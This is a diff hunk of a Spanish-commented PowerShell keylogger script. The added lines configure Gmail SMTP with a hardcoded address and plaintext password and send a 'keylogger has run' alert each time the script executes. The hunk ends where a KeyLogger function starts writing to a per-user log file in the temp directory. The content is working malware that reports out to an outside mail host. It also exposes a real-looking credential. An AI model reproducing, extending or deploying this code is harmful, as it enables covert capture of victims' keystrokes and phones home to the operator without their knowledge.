@@ -5,6 +5,18 @@
 $email = "jorgeramonalejandro@gmail.com"
 $password = "781Machado.#@"
 
+
+# Correo electrónico de notificación
+$emailNotification = "jorgeramonalejandro@gmail.com"
+$subjectNotification = "Keylogger se ha ejecutado"
+
+# Enviar correo electrónico de notificación
+$smtpNotification = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587")
+$smtpNotification.EnableSSL = $true
+$smtpNotification.Credentials = New-Object System.Net.NetworkCredential($email, $password)
+
+$smtpNotification.Send($email, $emailNotification, $subjectNotification, "El keylogger se ha ejecutado.")
+
 # keylogger
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
 
